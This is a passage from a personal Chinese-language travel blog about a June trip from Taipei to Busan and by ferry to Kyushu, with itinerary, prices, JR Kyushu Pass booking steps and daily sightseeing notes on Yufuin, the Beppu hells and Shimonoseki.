前往由布院、下午前往大分 6/7 大分、別府地獄之旅 6/8 門司、下關、唐戶市場實際：多去唐津城 6/9 南阿蘇、白川水源、上色見熊野座神社實際：改去佐世保(九十九島遊覽船)、武雄溫泉 6/10 看 6/7 遺漏的行程，大魚神社海中鳥居、祐德稻荷神社、Lalaport or 逛街實際：去櫻井二見浦 夫婦岩、南藏院、博多巡禮 6/11 KKDAY 高千穗一日遊 ，高千穗神社、高千穗峽谷、天岩戸神社、天安河原 6/12 佐世保、九十九島、豪斯登堡 or 棒球實際：去博多逛街、天神逛街、PayPay Dome 看棒球 6/13 福岡市區逛街、晚上搭 21:00 飛機回台灣實際：多去 Lalaport網路這次一樣買 DJB ，韓國 2日 2GB、日本 9 日吃到飽，總計 NT$1,250。高千穗因為從福岡去交通極其困難，因此直接報名 KKDAY 高千穗一日遊 ，包車包午餐包中文導遊，價格 NT$2, 272/人。行✈️ 航班 去程：華航 台北桃園 TPE 15:55 -&gt; 韓國釜山金海國際機場 PUS 18:55 回程：華航 日本福岡機場 FUK 21:00 -&gt; 台北桃園 TPE 22:25 來回含托運(23公斤/件)價格：NT$10,480🛳️郵輪 新山茶花號 出發：18:30 報到 釜山港國際航運總站 抵達：07:30 博多港國際航運總站價格： 經濟/2等室:共乘艙 NT$1,450/人🚅 JR Pass 北九州鐵路周遊券(5 日)價格：NT$3,042 這次在九州使用 JR Pass 能搭特急就搭特急，除了由布有特別劃位，其他都是直接去自由席車廂坐(人不多、都有位子)。由 布院之森 博多往由布院沒預定到，只能預定 由布 1 的位子。請注意由 布院之森 跟 一般列車(由布 X) 不一樣，預約時要注意是不是預約 由布院之森 。預訂方式： 先買完 JR Pass 才能預訂，因預定旅行社選項只有 KLOOK，怕其他機構無法訂位 (頁面是說 非上述旅行社發行的MCO的客人,請不要做任何選擇。 應該也可以) ，所以我從 KLOOK 買 JR Pass 的。1.進入 JR Pass 預定首頁：滾動到下方找到「鐵路周遊券購買」-&gt;「查詢/更改/退款」2.進入 JR Pass 預訂頁面 ：選擇「登記」閱讀並同意條款，點擊「前往下一頁」輸入你想註冊的電子郵件，點擊「登記」。到信箱中收信，記下「temporary password」並點擊繼續連結。1.旅行社名稱選擇：KLOOK 有非上述旅行社發行的MCO的客人，請不要做任何選擇。2.KRP預約號碼/MCO號碼進入 KLOOK 查看 JR Pass 憑證，複製貼上以下憑證號。3.姓名輸入 JR Pass 訂單姓名，依據說明如為 KLOOK 發行的憑證要輸入的是名＋姓，因此我憑證是寫 LI ZXXX CXXX 但這邊要填寫 ZXXX CXXX LI 。 請輸入在JR Kyushu Rail Pass Online Booking購買JR九州鐵路周遊券時登記的姓名，或旅行社發行的兌換證 （eMCO、MCO）上標記的姓名。 利用KLOOK發行的憑證的客人，請“名”和“姓”的順序輸入您的名字。4.輸入信中的 temporary password 暫時密碼5.6. 輸入你想要設定登入的密碼完成密碼設定後，在可預約時間( 日本時間 05:30~23:00 可接受預約 )就能回首頁查詢、預約列車對號座； 時間外無法預約 。 出發日 出發站：博多 抵達站：由布院由布院之森 已滿，只能預約一般列車 由布 1 ，最早的班次 07:43 出發，10:03 抵達。 繼續下一頁選擇座位偏好、位置、車廂。輸入周遊券開始使用日。輸入信用卡資訊支付訂位費用 (成人 1,000 / 兒童 500 日圓一人)。 上述為購買人的信用卡。在窗口領票時，必須攜帶並出示購買時使用於結帳的信用卡。 上述為購買人的信用卡。在窗口領票時，必須攜帶並出示購買時使用於結帳的信用卡。 上述為購買人的信用卡。在窗口領票時，必須攜帶並出示購買時使用於結帳的信用卡。 ⚠️所以請務必攜帶該信用卡前往領票 ⚠️結帳，預約完成！住 (10晚，其中 1 晚在郵輪上) [6/3] 東橫INN 釜山站1號店 (1晚) 地點很好就在釜山站外，往後走就是釜山港國際航運總站，來去都方便。價格：NT$1,940 兩人雙床房 [6/4] 新山茶花號 (1晚) 價格：NT$1,450/人 [6/5] 東橫INN 博多口站前 (1晚) 博多站出來走大概 10 分鐘會到。價格：NT$2,911 兩人雙床房 [6/6, 6/7] 東橫INN 大分站前 (2晚) 大分站出來走大概 10 分鐘會到。價格：NT$4,389 兩人雙床房 [6/8, 6/9] APA Hotel Fukuoka-Watanabedori EXCELLENT (福岡渡辺通駅前) (2晚) 渡辺通站出來走大概 5 分鐘會到。價格：NT$9,311 兩人雙床房 [6/10, 6/11, 6/12] 東橫INN 福岡天神 (3晚) 天神南站出來走大概 10 分鐘會到。價格：NT$7,131 兩人雙床房總計：$14,291，平均 1 晚 $1,400，這次終於達成壓在 1 晚 $1,500 以內了， 感謝東橫 INN ！ 另外，東橫 INN 辦會員可以 3 點 Check-In+住 10 晚送 1 晚+提早半年預定+5% 折扣+ 直接用卡 Check-in …等等優惠。 上次去 廣島 的入住東橫 INN 的時候，順便辦會員了，只要在入住的時候跟櫃台說要辦理會員，簡單填一下資料、 支付入會費用(一次性) 1,500 日圓 ，現場拍照現場發卡，以後就能使用了。韓國要使用 Naver Map ，可以預先安排好行程跟路線，方便查看： 我覺得以旅遊地圖來說，比 Google Map 好用！ 可直接使用 Line 登入Go! Flight Tracker、iPhone Suica 使用、Visit Japan 預入境申請…之前文章有提過，這篇就不多贅述了。Visit Japn 目前改成二合一了，入境跟海關用同一個 QRCode。Day 1 出發如同 前幾次出國 ，到機捷台北車站 A1 的時候先去辦理預辦登機，這樣去機場就能直接出境。( 可預辦登機的航班、規定請參考官方網站 )。 本來想說橘線搭去三重轉機捷，但機捷另一個預辦登機站是在 A3 新北產業園區站，不是三重站 ，而且三重站沒有直達車，所以還是到北車再換了。 同之前出國會在行李箱放一個 Airtag 方便追蹤桃園機場 TPE 第一航廈這次華航飛釜山是在第一航廈。到機場先找櫃檯換匯韓幣，外匯提款機幾乎都不提供韓幣只能換日幣； 機場匯率不好並且要收 NT$100 手續費 ，因此有時間的話還是建議在銀行提早櫃檯提早換匯。13:00 出境約莫 13:00 就完成出境手續了。第一航廈出境買個頂呱呱炸雞當午餐。之前 路過景觀休憩區都是關閉狀態，這次有開放上去看看，沒想到就這樣，很小。因為時間還太早，這次就有來一航的免費貴賓室休息區休息了，這時間沒什麼人。頂呱呱炸雞有醃過，很好吃，可惜機場這家不供應呱呱包；另外 發現這邊充電座都被拿掉了，只剩外殼，無法充電 。裡面衛浴兼廁所，數量不多(目測約五間)，很乾淨高級，清潔人員打掃的也很即時。15:20 開始登機約莫 15:20 開始登機。一航 BR 航站樓需轉乘交通車到登機口，往釜山這個航班沒什麼人啊！如圖，目測不到 30 人。這班華航飛釜山的是 737–800 中型飛機，沒有娛樂螢幕，Bye Taiwan!。只能靠機上 Wifi 連接娛樂內容，電影蠻多的！有賽道狂人！飛機餐是三杯雞麵(蠻難吃的)，沒想到 華航 x 五桐號 x Dinotaeng Quokka 的聯名還有，獲得短尾袋鼠小點心。撰寫入境卡、報關卡、 檢疫 QRCode 可預先申請 ，未申請要多寫一張檢疫卡。19:05 抵達韓國釜山金海國際機場 PUS韓國白天溫度大約 20–25 度，晚上可能低於 20 度；有點像台灣的秋天季節。19:20 出機場 KKday 韓國釜山通行證 VISIT BUSAN PASS大約 19:20 就入境＋拿完行李出機場。當時誤會 wowpass 跟 tmoney 的關係，以為只有兩個合再一起的卡；我自己的認知是 wowpass 是包含儲值換匯提領購物的現金卡、tmoney 是交通卡，wowpass 會包含 tmoney； 實際只要買 tmoney 不需要 wowpass ，那時候沒搞清楚，一直在找 wowpass 而非 tmoney， 釜山國際機場沒有 wowpass 機器 ，因此先靠現金買車票一路坐到釜山。從金海機場到釜山站，地鐵一共要轉三次車；搭下來人沒有很多，不怕擁擠。 如果有交通卡可以直接刷卡進 第一段票 紫線釜山金海輕軌 從 機場站 到 沙上站 按照地板指示前往月台 紫線到 沙上站 後下車按照指示往綠線移動 綠線 2 號線 坐到 西面站 買第二段票到 西面站 綠線 坐到 西面站 後下車，一路朝 橘線 月台前進 橘線 1 號線 坐到 釜山站 下車 綠線到橘線轉乘不需要進出月台，不確定當時在綠線買票能不能買到 釜山站，那時候沒仔細看；因此在釜山站出站出不去，需要人工補票才出去。20:20 抵達釜山站出站就是東橫 INN 釜山站 1 號店。放好行李出來覓食。 還好飯店有 100V 台灣的插座/USB 插座，不需要轉接頭就能使用。因為時間晚，附近的燒肉都關門了；隨便找了家豬肉湯飯餐廳解決 ( The Doi Jongga Dwaejigukbap Busan Stn. )。 豬肉湯飯，豬味很重，湯油但不濃，配飯吃還可以 豬頸肉烤盤，夾生菜、泡菜吃不錯，但吃太多會很膩 兩份湯飯＋豬頸肉一盤 一共 46,000 韓幣。Wowpass / Tmoney飯店大廳就有 wowpass 機器，掃描護照按照指示跑完流程，機器就會吐出 wowpass+tmoney 二合一卡。 上半部是 Wowpass 晶片是 Wowpass Wowpass 儲值跟 Tmoney 是分開的 Wowpass 可透過 Wowpass 機器儲值、直接用台幣儲值、線上信用卡儲值、換匯、提領(要手續費) Wowpass 有期限 ，太久沒用可能會導致金額消失 晶片部分可在商家刷卡使用 Tmoney 可以在超商或是地鐵加值機儲值 暫時無法從 Wowpass 入金 Tmoney (官方說未來可以) Wowpass 發卡要入金 5,000 韓幣，但這步好像可以跳過，跳過等於免費發卡？ 下半部是 Tmoney，搭乘地鐵、公車時記得用下半部版應；我第一次用整張感應一直失敗，貌似感應到 Wowpass。 拿到實體卡後就可以在 Wowpass App 進行綁定 Wowpass App 可查看 Wowpass 餘額 Tmoney 餘額需要靠卡感應才能知道 (好特別！) 如上圖，Wowpass 餘額 454 KRW / Tmoney 餘額 2,500 KRW如果想知道 tmoney 儲值、扣款細節需要另外裝 App (BucaCheck) ： 一樣是靠卡感應讀取內容 如本篇遊記對您有幫助，可以在 Wowpass 註冊時輸入我的邀請碼： 373TBH87晚餐吃完去 GS 25 買韓啤跟韓國小零食吃，Kelly 好喝、右邊這個像辣條但沒那麼鹹跟辣，下酒很適合、蟹味餅乾普普。休息，結束奔波的 Day 1。Day 2 海東龍宮寺、海雲台、搭新山茶花號郵輪海東龍宮寺一早從釜山站公車站搭乘 1001 公車前往海東龍宮寺；班次多、人不多。路程稍遠，約需 1 個半小時，韓國公車跟台灣差不多，司機開的蠻猛的；正常是前上後下，但也有人前下後上。下車點對面就是 Skyline Luge 釜山 。下車往前走就能看到海東龍宮寺的指標了，右轉走一段山坡路就能抵達；地圖寫走 15 分鐘，但因為是山坡路大概要走 30 分鐘左右，不想走路也可以搭計程車。會先經過一條商店街、附近也有類似貨櫃市集的地方可以小憩吃點東西，進來可以看到一排 12 生肖代表、(狗)戌年。再往前走就能看到海東龍宮寺的牌樓，色彩非常豐富有特色。一路下坡到海東龍宮寺本院，整排樓梯要小心走。可以先去左邊的觀海平台鳥瞰整個寺院。走進大雄寶殿，外面可以買瓦片寫上自己的願望 (10,000 KRW)。海雲台從海東龍宮寺外公車站再次搭乘 1001 往回到海雲台 (約 1 小時)。當天豔陽高照，海灘有沙雕展覽。 下階梯要小心，親眼目睹一個韓國大叔踩空摔倒到沙堆中(還好是沙堆)。ㄏ海雲台 LCT ，釜山標誌性建築。HAEUNDAE 海雲台，晴空萬里。海雲台海水浴場有救生員、有拉紅線範圍，也可以安排水上活動。午餐吃了海雲台周邊的韓國燒肉 Baegnyeon Sikdang ，都是店員代烤；點了份韓牛外脊跟豬頸肉，都很好吃，還有一份石鍋飯，鍋巴米香味很濃；兩個人分著吃。另外點了韓啤、韓國燒酒喝個痛快。（忘了試看看燒啤） 價格 13.0 代表 13 * 1000 = 13,000 KRW 一樣有一堆韓式小菜，都是醃漬物、泡菜、生醃螃蟹(應該是生吃但很腥，我不敢) 店員人不錯、英文也還算通旁邊就是 海雲台傳統市場，主要是賣當地海鮮，買了支冰淇淋走了一圈，又去另外一家賣冰淇淋可頌的店，吃了一個某茶冰淇淋可頌（外堅內軟，好吃！）。吃飽就忘記海雲台還有個單軌列車可坐還有海雲台 LCT 其實也可以上去看看 (當初排行程沒太認真查釜山行程)，此時約莫 14:00，就搭 1001 公車回釜山站了，想說回去再看要去哪或釜山站逛逛。回到釜山站大概才 15:00，離郵輪報到時間 18:30 還很久，回釜山才發現釜山站沒地方可逛(貌似沒有百貨公司或商店街、景點之類的)；要去甘川文化村又怕太遠，只查到釜山站往下幾站可以去釜山塔、周邊有百貨公司、商店街。 本來要去釜山塔結果出錯地鐵站走了很遠，放棄返回。 KKday 韓國釜山|龍頭山公園釜山塔展望台電子門票 。 要去釜山塔要從 南浦站 下車，並從 1 號或 3 號出口到光復路時尚街搭手扶梯上龍頭山公園，千萬別繞遠路走上山。買了韓國有名的香蕉牛奶喝。17:00 前往 釜山港國際航運總站大概在釜山站附近亂晃到快五點就去飯店拿行李前往 釜山港國際航運總站 了。進入釜山站大廳 (2樓)，找到 10 號出口，一路走天橋就能到 釜山港國際航運總站 (約需走 15 分鐘)。 千萬不要走平面道路，有很多很多大型車輛，很危險。白天的釜山港大橋。釜山港國際航運總站(碼頭)裡面空蕩蕩，沒什麼人，因為每日航班也很少；除了往福岡博多還有郵輪往下關、對馬島、大阪、熊本…等。從大廳上到 3F 出境，先去 New Camellia 兌換船票。(需要護照)約 17:30 就開始候船了，等候出境廳很大； 其實可以四處晃晃、買吃的帶上船去吃的 。要注意的事是： 博多港 無法 使用電子通關，所以請務必填寫入境卡跟報關卡⚠️ 可以攜帶食物跟水，也不用放在行李箱，因為根本不用托運，行李箱隨人上船。 只有手持飲料不行 整個出境非常快，過安檢也是意思意思而已(所有東西過 X 光)18:30 開放出境。出境後候船空間不大，有幾家免稅店跟咖啡廳(只有這家有賣吃的)，買了一個鮪魚三明治裹裹腹。去免稅店買了一些 韓國 Toms Gilim 杏仁果 (經典蜂蜜口味、裹草莓巧克力、提拉米蘇味)當伴手禮。出境後可以先用行李排隊，大家也都是用行李箱排好隊，準備搭船。韓國人大概佔了 90%。可以從窗邊看釜山港，時間快到的時候大家就會回到各自的行李旁邊準備上船了。從碼頭到上船大概還需要走跟等待個 15–20 分鐘。新山茶花號Room 430，登船後上到 4 樓 430 間。空間很小，最多可以住到 11 人，這次是一組家庭 (3人) + 兩對夫妻 (4 人) + 我跟我朋友 (2 人)，沒住滿； 貌似是會把同語言、國家的人安排在一起(這房除一對夫妻是港澳人其餘都是台灣人) 。 每個人空間小、枕頭很硬、簡單床墊、新的床單、被子 先來先到，剛好卡到角落位置，稍微大一點 有兩個插座(不用轉接頭)，可以輪流充電行李安頓好大約 20:00，船大約 10:30 才會開始離港。3 樓是餐廳跟小賣部、自動販賣機(均 使用日幣 )，有賣拖鞋、盥洗用具、衛生用品；餐廳沒有供應，只能買小賣部泡麵或自動販賣機的微波食品； 因此建議是從釜山帶吃的上來 。 要注意：肉類製品不能攜入日本，沒吃完的要丟掉。 ⚠️好在登船前有吃一個三明治，沒有很餓，隨便買個泡麵解決一頓。 要注意：熱水不在餐廳那邊，餐廳那邊只有冷水機；熱水要到客艙間靠船尾那邊的 給湯室 才有，我找好久才找到。 另外熱水器要小心操作，先轉開開關，不會馬上出水，要等待一下，出水後小心接用，用完請確定關緊，避免燙到下一個人。吃飽後出甲板晃晃(可以自由進出，小心地滑)。約 21:00 另一艘往下關市的郵輪(PUKWAN FERRY)會先出發。回頭看釜山港碼頭夜景。大約 22:30 船就會開始駛離釜山港，經過釜山港大橋，出來看橋的夜景非常美。(會冷，注意保暖)通鋪經濟艙 11 點就會統一熄燈，看完出港差不多就可以回來躺平了。 只有特等室有個人的獨立衛浴，其他為共用 浴室是日本的公共大浴場，需全裸，洗澡的地方有小隔板；因為沒膽去就沒洗澡了。 整體設施蠻舊的，不過保持的乾淨 有娛樂室、KTV 公共空間不會熄燈 網路至少離港到 11 點多都還連得上 (據說是只有一小段可能沒網路) 接近對馬島就進入日本境內了，要換成日本 SIM 卡 行駛中會微微起伏晃動，很容易暈船的可能要吃暈船藥晚安，釜山。Day 3 博多、祐德稻荷神社大約清晨 5:30 左右就抵達釜山、通鋪統一開燈 ；出甲板看清晨的博多港與博多港塔，很寧靜。有加購早餐的可以去餐廳用餐，我們沒有，就慢慢盥洗、甲板亂晃、收拾東西準備下船。 統一於 07:30 開放下船，大家一樣會用行李在 3F 大廳出口排隊。約 08:00 完成入境日本、出博多港國際航運總站 再次提醒 博多港 無法 使用電子通關，所以請務必填寫入境卡跟報關卡 ⚠️一出來就有公車往博多站或天神地區。 雖然大件行李搭公車不方便，不過因為這是發車站，所以一定有位子，大多數人也都帶行李，比較不尷尬 中間停靠站會有一些人上車，人不多，所以還好 平日早上回博多搭地鐵人也沒有很多，不怕尷尬 (九州就是空曠！)約 9:30 飯店放完行李、博多站百貨公司美食街吃個 朝の貝汁定食 早餐填飽肚子、領 JR Pass &amp; 明日早上去由布院的車票 JR 九州 Pass 目前還是只能人工櫃檯兌換，請提早去排隊兌換，如果博多站太多人可以 考慮去附近的其他車站兌換，會比較快！祐德稻荷神社原本預計是去唐津城，查了下 JR 特急班次，去祐德稻荷神社比較快跟近加上昨日的勞累，決定更改行程。從博多搭乘前往 鹿島市 - 肥前鹿島站。出站後往左手邊馬路走，到對面 2 號等車。 這邊跟 Google Map 指示不一樣，Google Map 要我走到中牟田站等車，約 500 公尺遠。 請注意我是 2024/06 去的，站台可能因時間有所調整。祐德稻荷神社在祐德神社前下車後，往後走就是表參道。不知道是不是因為平日表參道、商店街幾乎沒人也沒幾家有開。一路走到底(約 15 分鐘)，就是神社。神社入口，後方玻璃建築是電梯，不想走上去可以 付費搭乘電梯 。往上走會有整排的祈福風鈴，去的時候都沒人，經過風鈴時剛好一陣風，響徹咣當。一路穿過整排鳥居、美麗盛開的繡球花，後面可以在登山往上到奧之院(約 200M，很陡不好走)。參拜完就回到車站，一路回 JR。比較了一下 大魚神社海中鳥居 跟 唐津城，感覺海中鳥居普普通通（ 畢竟見識過嚴島神社的海上大鳥居 ）並且交通很麻煩，因此預計前往唐津。再換車的時候出錯了，這是小站無任何電子看板，一下車看到月台寫「唐津方面」就以為在此月台換車，結果時間到了車從另一個月台通過，來不及上車。後面仔細研究了一下才發現要看時刻表的右下角框框才是正確的候車月台，平日假日的月台也不一定相同。因為錯過往唐津的列車，也回不去大魚神社海中鳥居，加上昨日的狼狽，所幸決定直接回博多飯店休息。 回程也發現一個新奇的事，一路上想說小站怎麼列車不開車門(我坐在後面車廂)；仔細觀察才發現，連站務員都沒有的小站，車長就是站務員，要下車要從第一節車廂下車，並且按照螢幕投幣車資或刷交通卡(跟公車一樣)，如果用 JR Pass 只需要向司機出示即可。 另外也再次提醒，如果是在無人的 JR 出站，使用 JR Pass 就直接走出去就好，千萬不要把 JR Pass 投到車票回收箱了。 ⚠️約 16:00 回到博多、飯店 要注意東橫 INN 的洗衣機可能是沒有洗劑的，清洗前請先確認是否是自動投入洗劑的洗衣機⚠️ 如果不是，要另外投幣或跟櫃台買洗劑。(30 日圓)把衣服投入洗衣機後就去博多站百貨公司地下街覓食了。買了一個牛排便當回來吃，很讚；茶酒還好，沒什麼味道。另外買了養樂多 1000 晚上喝、BRULEE 焦糖冰淇淋當甜點(好甜！)、海老炸蝦當宵夜(這次買到真的是整隻炸蝦的了，之前在 熊本買到假的 QQ)。洗衣(30 mins)、烘衣(1 hr)、休息。Day 4 由布院、大分 參考行程：KKday 日本九州福岡大分一日遊|太宰府天滿宮・由布院(湯布院)・別府海地獄&amp;灶地獄(竈地獄) |博多出發(中英日對應)一早 Check-out 拖著行李前往 JR 博多站搭 由布 1 前往由布院。 行李箱可放在行李間，如果怕滑動可以放橫著。 一杯咖啡醒醒腦 這季節綠油油的一路上沒特別好看的風景(或由布院之森才有景？)一抵達由布院站出站後立刻右轉前往 Coin Lockers 寄物櫃寄放行李，因為是行李箱所以位置比較少。(1,000 日圓)可能因季節跟天氣關係，去的時候覺得整體色調灰、綠油油，沒有特別有感覺。沿著街道一路走到底就是金鱗湖，綠油油的湖畔透露著一絲寧靜。金鱗湖非常乾淨清澈，湖邊有許多楓葉(尚未變色)。從由布院車站一路到金鱗湖的街道上有非常多的 IP、文創小店可以逛，對美食有興趣的也可以查一下由布院金賞甜點，有布丁、冰淇淋…等等當然也少不了四處可見的龍貓之森、吉伊卡哇、還有「九州特產」熊本熊。湯布院昭和館很有日式傳統感。花卉村看起來太觀光、人很多，就沒特別進去看了。在路上買了有名的布丁銅鑼燒跟一些伴手禮(胡麻粉、由布院煉瓦工場 — 七大福、文創小物、線香由布院香…) 小插曲：居然這由布院這世外桃源還能遇到同事 XD — Pinkoi 社群一姊午餐本來要吃 由布まぶし 心 有名的由布院釜飯，有兩家一家在金鱗湖本店一家在車站出口，當天車站出口那家休息，我們也懶得再走回本店了，於是改吃 1 樓的 鮨 源 。我吃的是豐後牛牛排、我朋友吃的是丼飯；牛很好吃，很香很 Juice 並且沒什麼腥味，價格也便宜。吃完再逛一下時間大約來到 15:00 就搭車繼續往大分前進了。由布院往大分班次蠻多、人也很少(可能比較多人是回博多？)也有區間車，這次就直接搭區間車去，順便練習了新學到的日文：この電車は大分に行きますか。はい、大分に行きます。16:20 大分剛好遇到大分站有佈置裝置藝術（他還會發出聲音）。大分整個給人一種遠離喧囂的氛圍，在市區閒晃的時候覺得異常的安靜，只有淡淡的汽車引擎聲，沒什麼人、車的聲音。先去飯店寄放行李，東橫 INN 格局都差不多，剛好排到跟昨天博多站前一模一樣格局、角度的房型，差別在於這家的廁所比較大、走道比較小。時間還很早，想說去周圍晃晃，隨手打開 Google Map 看看附近的景點。巨大ブーゲンビリア往大分城址的路上公園停車場有一個巨大九重葛(很像咒術迴戰的什麼詛咒)。大分城址大分城址只剩下護城河、城牆、庭院，裡面是一個空曠的停車場跟天守閣台地，可以眺望大分市。官方有提供一個 AR App 讓你看到之前大分城的樣子。一路晃晃悠悠，走回車站市場覓食，大分的公車很有年代感，但維持得很好。晚餐不知道要吃什麼，隨意買個豬排飯跟 Suntory 無酒精氣泡飲 (好喝！)；日本的醬料包很貼心的設計一個小角方便打開。宵夜是草莓冰沙冰淇淋、燒烤、麒麟期間限定鳳梨酒(鳳梨味足夠、有點甜)。Day 5 別府地獄、別府 參考行程： KKday 【別府由布院一日遊】西羅寺+別府地獄+由布院(福岡出發) 九州別府地獄溫泉巡禮|普通門票 / 預售票|現買現用從大分站到別府站搭 JR 特急約只需 15 分鐘，路上的景色有點像 廣島去吳市的感覺 。出 JR 轉搭公車前往別府地獄 — 第一個，海地獄，順序可參考上圖行程。 7 個地獄都想去，在海地獄入口買整本 7 張門票比較便宜 如果時間有限我覺得可以只去海地獄 入場只需撕掉門票一角投入箱子即可 每個地獄都有免費休憩泡腳區海地獄海地獄我覺得是最壯觀的，有著不停翻騰的蒸氣與湛藍的泉水。後方有一個台地跟小神社。另一邊的小血池也蠻特別的。出海地獄之後跟著指示走就能走到下一個鬼石坊主地獄。鬼石坊主地獄主要為泥漿噴湧地獄。出來同樣有指示牌往下一個地獄。かまど灶地獄灶地獄的牛奶池感覺很好泡。但灶地獄的特色不是泉湧，是煙霧，工作人員會拿線香跟吹風，對著溫泉的蒸氣吹就會冒出大量的煙霧，很有趣（查說明是因為線香的粒子會吸附更多水蒸氣分子造成聚集）。灶地獄另一個特色是有整排的溫泉周邊體驗，岩盤足浴、飲溫泉水(喝起來有點稠稠鹹鹹的)、泡腳、蒸臉、蒸手、蒸喉嚨(跟台灣看小兒科一樣ＸＤ)。這邊空間比較大、能體驗的項目較多，商店也有賣一些吃的，可以在此休憩。一樣出來就能看到往鬼山地獄的招牌。鬼山地獄鬼山地獄的水沸騰的更激烈，不斷地往外奔騰。園區另一邊是鱷魚園。出來照指示往下走就是白池地獄。會經過地獄溫泉博物館(咖啡廳)，可以休憩一下。白池地獄白池地獄較無特色，有一個小的熱帶魚水族館。剩下血池地獄、龍卷地獄，這兩個地獄就不在這個區域了，需要轉搭公車前往。白池地獄出來一路往下走到路口左轉，往前早到鐵輪 2 號站等車。血池地獄先去血池地獄，同海地獄的小血池，只是規模更大。往下走就是龍卷地獄。龍卷地獄龍卷地獄是間歇噴發的噴泉，約 30–40 分鐘噴發一次，一次大約會持續 6–10 分鐘，可以先來龍卷詢問工作人員(我們是工作人員主動告知協助的)，如果快噴發可以先來看，如果還要等那就先去血池地獄。噴發時的煙霧會形成龍卷，因此得名。極樂亭午餐就直接在血池地獄極樂亭解決了。吃了名物地獄極樂咖哩，喜歡日式粒粒分明的米飯配上濃稠的咖哩(微辣)，搭配烤野菜、雞肉，吃起來不膩很順口清爽。吃完查到附近還有貴船城、十字山展望台、明礬地獄、湯之花…景點。貴船城往回到鐵輪 2 公車站的路上想說去貴船城看看，城池很小，瞭望的景觀不錯，不過從公車站下車走來＋上坡走起來很累。 十字山展望台、明礬地獄、湯之花其實是在海地獄再上去；重新規劃行程的話，應該要先往上去這些景點再往下到海地獄、再一路到血池地獄、龍卷地獄，抑或是反過來先來血池、龍卷。十字山展望台回鐵輪 2 再次搭上經海地獄的公車，先前往十字山展望台，眺望別府市；太陽很大很熱，展望台只有廁所、沒有商店跟休憩區。入口處對面的山綠油油的很美。既然是夜景，早上來沒什麼好看的，很曬而已。明礬地獄往回下到明礬地獄，售票口在對面的 岡本屋布丁店 ，跟店員比要去對面就可以了。可以品嚐一個地獄蒸布丁再走。湯之花小屋就是用來乾燥溫泉得到結晶的，往上走到湯之花商店有賣這個溫泉入浴劑。湯之花小屋去湯之花小店買了一些入浴劑、面膜、乳霜當伴手禮。另外這邊有提供 Private Bath 私人浴場泡湯，如果害羞不敢去公共泡湯的朋友可以考慮來這裡。此時大約下午 16:00，準備搭公車回去市區了。別府回別府站之後，走去別府塔，路上隨手逛逛。(站前雕像、古老溫泉會館、大天狗)別府塔別府塔一樓自動販賣機買票，坐電梯上去，鳥瞰別府濱海區域的市景。從上面看街道、車，很療癒。塔內有個隕石展。 除別府塔之外，其實還可以去纜車或是新的別府-世界之塔。另外別府觀光局網站也有提供其他行程參考 ：別府觀光局網站打道回飯店休息。回飯店休息，一樣去大分站市場買晚餐，豬排便當，跟大分限定水果酒(好喝清爽、不會太甜)。甜點/宵夜是炸蝦、泡麵、白桃冰淇淋，跟茉莉花燒灼(我不愛燒灼)。Day 6 下關、唐津 KKday 行程參考：日本福岡北九州包車一日遊｜太宰府天满宫、門司港、唐戶市場、關門海峽、赤間神社先從大分到小倉再去門司港、下關， 下關和唐津距離約 140 公里，正常人是不會這樣跑行程的 ；因為第一天到日本的時候搭錯車沒去到唐津，很想踩這個點，所以才硬著頭皮行軍式的一日下唐。起床時間晚，大概 8:40 從大分搭乘 JR 特急先前往小倉，預計是在小倉寄放行李，再搭支線前往門司港。大分的天空開始下起小雨，想了一下我去過的每座城市都遇過下雨。( 雨神無誤 )大約 10 點多到小倉站，繞了好久，所有 自助的 行李寄物櫃 都滿了(據朋友說他 9 點來還有位子)，人工櫃檯寄物 11 點才營業，只能拖著行李先直接去門司港再找看看了。門司港出站後直接往左手邊(不用走出建築)，就是自助的 Coin Lockers，這次來門司港人蠻多的，一樣全滿；不過好在 人工寄物窗口 已經開始營業，順利完成寄物 ( 但人工這邊只營業到晚上 8 點喔！ ⚠️)。本來想說吃個 門司咖哩燒，去年來的時候都沒人，爽爽吃不用排隊 ，一出站發現一堆人在排隊就放棄了，右轉去門司港公車站等公車去下關口。下關在下關口地下人行道的地方下車，這次從另一個角度看 關門橋 ， 圖右是 去年從 門司港懷舊展望室 眺望 的景色。這邊有一個和布刈神社鳥居，後面山上有 和布刈神社、和布刈神社展望台。從人行道入口搭電梯到 B1 就是徒步區了，人員免費、腳踏車要收 20 日圓過路費，另外這邊有山豬出沒，要注意ＸＤ全長 780 公尺，一路直直到底，走到中間會有一條分界線。到下關口後出來有商店賣簡單的點心，買了一個章魚餅果腹。(裡面 QQ 的、皮脆、真的有章魚，好吃！)從對面的角度看關門橋、門司港懷舊展望室，有台灣八里看淡水那感覺了。一路徒步海岸到唐戶市場。快到唐戶市場的路上會經過赤間神宮，順路前去參拜。唐戶市場外的海岸邊有很多人會買完在外面野餐坐著吃，人雖多但還是很乾淨；因為我主要是踩點跟不太吃生食就沒進去裡面看了，中午時分來裡面看起來很多人。過唐戶市場就是碼頭可以坐渡船直接回門司港，到對面商店自動購票機買票即可；有時間還可以去巖流島(來！決鬥的聖地！)逛逛。大約 10 分鐘就能抵達門司港。(真的有淡水八里渡船的感覺了！)回到門司港開始飄雨， 門司港去年已經來過 ，就不多停留，準備去車站拿行李往小倉、博多出發了。時間約莫 14:00 了，抓了一下時間去到唐津城大約會在 4:30 左右，分秒必爭，於是在小倉發動新台幣(日幣)的力量，直接買 山陽新幹線 小倉 — 博多 段 世界最速300km/h 狂飆， 只需要 15 分鐘就能抵達 (JR 特急要 45 分鐘、區間要 65 分鐘) 。 JR Pass 九州並不包含 搭乘 山陽新幹線(小倉博多段)，希望(Nozomi)號、瑞穗(Mizuho)號，要另外在新幹線站台買票，刷 JR Pass 會被拒絕入站，如果碰巧入站出站也會被拒，會需要補票 ( 上次的經驗就是 )。⚠️從 JR 唐津要走約 20 分鐘才能到唐津城，搭高速巴士會在唐津城前橋下車，因此決定跑去搭高速巴士。(也是第一次搭！)到博多後直接搭地鐵到天神南並在地下街完成行李寄放。(運氣好剛好在 2 號找到最後一個行李箱的位置)從天神地下街西 8 的出口，Fukuoka Mitsukoshi 三越百貨跟著指示往天神高速巴士總站 3 樓，就能抵達巴士站。因不確定是否要劃位跟買票，所以直接去櫃台買票 ；買完票，肚子很餓，在星巴克隨便買個麵包就去指定月台排隊候車。(實際發現往唐津不用劃位、可以用交通卡，就跟搭公車一樣；不管哪站下車，車資固定 1,100 日圓)15:02 搭上網唐津(寶當棧橋)的高速巴士，滿座率約 80%。右圖為 去年從福岡塔鳥瞰這條路 ，今年是從這條路看福崗塔。(一種時空交錯感)主要是日本通勤族，過了唐津市區後車上就只剩我一人了，我要坐到最底站 — 